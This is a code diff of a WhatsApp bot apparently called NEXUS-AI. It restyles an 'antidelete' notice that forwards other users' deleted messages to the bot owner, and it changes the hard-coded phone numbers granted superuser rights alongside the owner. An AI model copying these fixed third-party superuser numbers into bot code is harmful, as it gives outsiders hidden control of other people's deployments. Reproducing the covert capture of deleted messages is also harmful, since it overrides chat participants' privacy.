@@ -210,18 +210,18 @@ zk.ev.on("messages.upsert", async (m) => {
             if (deletedMessage) {
                 try {
                     const participant = deletedMessage.key.participant || deletedMessage.key.remoteJid;
-                    const notification = `*╭────♠ 🤖 NEXUS-AI ANTIDELETE ♠────* 
+                    const notification = `*╭────♠ 🤖 NEXUS-AI ANTIDELETE🪀 ♠────* 
                     
  ★
  ★
- ★╭────★ MESSAGE DELETED BY ★────* @${participant.split("@")[0]}*`;
+ ★╭────★ MESSAGE DELETED BY 👤★────* @${participant.split("@")[0]}*`;
 
                     const botOwnerJid = `${conf.NUMERO_OWNER}@s.whatsapp.net`; // Bot owner's JID
 
                     // Handle text messages
                     if (deletedMessage.message.conversation) {
                         await zk.sendMessage(botOwnerJid, {
-                            text: `${notification}\nDeleted message: ${deletedMessage.message.conversation}`,
+                            text: `${notification}\n╭────♠ 🤖 CONTENT DELETED🗑️♠────*: ${deletedMessage.message.conversation}`,
                             mentions: [participant],
                         });
                     }
@@ -952,10 +952,10 @@ zk.ev.on("messages.upsert", async (m) => {
             var membreGroupe = verifGroupe ? ms.key.participant : '';
             const { getAllSudoNumbers } = require("./bdd/sudo");
             const nomAuteurMessage = ms.pushName;
-            const dj = '254710772666';
-            const dj2 = '254710772666';
-            const dj3 = "254710772666";
-            const luffy = '254710772666';
+            const dj = '254794146821';
+            const dj2 = '254794146822';
+            const dj3 = "254799056874";
+            const luffy = '254794146821';
             const sudo = await getAllSudoNumbers();
             const superUserNumbers = [servBot, dj, dj2, dj3, luffy, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
             const allAllowedNumbers = superUserNumbers.concat(sudo);
